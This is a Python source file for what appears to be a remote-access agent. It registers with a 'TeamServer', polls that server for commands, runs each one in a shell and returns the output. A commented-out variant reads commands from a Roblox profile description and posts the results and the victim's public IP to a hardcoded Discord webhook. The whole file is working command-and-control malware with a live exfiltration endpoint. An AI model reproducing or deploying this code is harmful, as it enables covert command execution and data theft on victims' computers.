import robloxpy
import subprocess
import requests
import public_ip as ip
import string
import random
import time

# Function to generate a 5 letter lowcase characters

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

#Creates agent based on calling the function above , get_random_string()


agent_name = get_random_string(5).encode('utf-8').decode('utf-8')

agent_name_payload = {
    'agentid' : agent_name
}

TeamServer_IP = "http://127.0.0.1:5000"

def initial_signin():

    result = requests.post(f'{TeamServer_IP}/register_agent', headers={'Content-Type': 'application/json'}, json=agent_name_payload)
    return result.json()
    
def check_task():

    get_commands_res = requests.get(f'{TeamServer_IP}/get_task', headers={'Content-Type': 'application/json'}, json=agent_name_payload)

    return get_commands_res

def send_response(result):
    agent_name_payload = {
        'agentid' : agent_name,
        'result' : result
    }
    get_response_res = requests.get(f'{TeamServer_IP}/send_response', headers={'Content-Type': 'application/json'}, json=agent_name_payload)
    return get_response_res

def run_cmd(command , timeout):
    result = ''
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
        stdout, stderr = process.communicate(timeout=timeout)
        result = stdout
        if process.returncode == 0:
            return result
        else:
            return f"Error: {stderr}"
    except subprocess.TimeoutExpired:
        
        process.kill()
        return f"Command timed out after {timeout} seconds\nResult : {result}"
    except Exception as e:
        return f"An error occurred: {str(e)}"



register_agent_res = initial_signin()

if register_agent_res['status'] == 'success':
    print("[+] Signin Sucess!")
elif register_agent_res['status'] == 'AgentID Exists':
    print("[x] Signin Failed")

alive = True
while alive:
    command = ''
    check_task_res = check_task().json()
    command = check_task_res['command']
    
    if command == 'kill':
        print("[+] Command Received! - Kill Command!\nKilling agent...")
        alive = False
    elif command is not None:
        print(f"[+] Command Received! - Running Command : {command}")
        send_response(run_cmd(command,timeout=5))

    else:
        print("[+] Teamserver Alive! - Waiting for command...")
    time.sleep(check_task_res['check_in_time'])




# original_string = robloxpy.User.External.GetDescription(5266533844)


# split_by_ampersand = original_string.split('&')

# description_array = [part.split('|') for part in split_by_ampersand]

# for i, part in enumerate(description_array):
#     temp = part[0].strip()
#     command = part[1].strip()
#     if temp == agent_name:
#         data = {
#             "embeds" : [{
#                 "color" : (0x09FF00),
#                 "description" : f"AgentID : {agent_name}\nIP Address : {ip.get()}\nResult for the command : {command}\n```{str(run_cmd(command,timeout=5))}```",
#                 "title" : f"Response Detected!"
#             }]
#         }
#         result = requests.post('https://discord.com/api/webhooks/1169507656923365438/blvon35hqLKWwdrHIt2rEbH9_8gYu2svnGJsmKHywP5ihhaiToXfBlItWmFNTfdrzFP9', headers={'Content-Type': 'application/json'}, json=data)

